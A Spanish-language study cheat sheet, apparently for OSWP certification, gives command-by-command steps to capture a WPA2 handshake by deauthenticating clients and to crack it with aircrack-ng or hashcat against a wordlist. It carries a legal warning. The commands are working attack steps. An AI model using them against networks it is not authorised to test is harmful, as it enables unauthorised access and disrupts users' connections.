---
title: WPA2 - Captura y crackeo de handshake
tags: [wifi, oswp]
---

> [!warning] Legal
> Solo en redes propias o con autorización explícita — la deautenticación es un ataque activo y detectable.

## Modo monitor

```bash
airmon-ng check kill
airmon-ng start wlan0
```

## Capturar el handshake

```bash
airodump-ng wlan0mon --bssid AA:BB:CC:DD:EE:FF -c 6 -w captura
```

En otra terminal, deautenticar para forzar el reconnect y capturar el handshake:

```bash
aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon
```

## Verificar que el handshake quedó capturado

```bash
aircrack-ng captura-01.cap
```

## Crackear

```bash
aircrack-ng captura-01.cap -w rockyou.txt

# o con hashcat (más rápido en GPU), convirtiendo primero:
hcxpcapngtool -o hash.hc22000 captura-01.cap
hashcat -m 22000 hash.hc22000 rockyou.txt
```
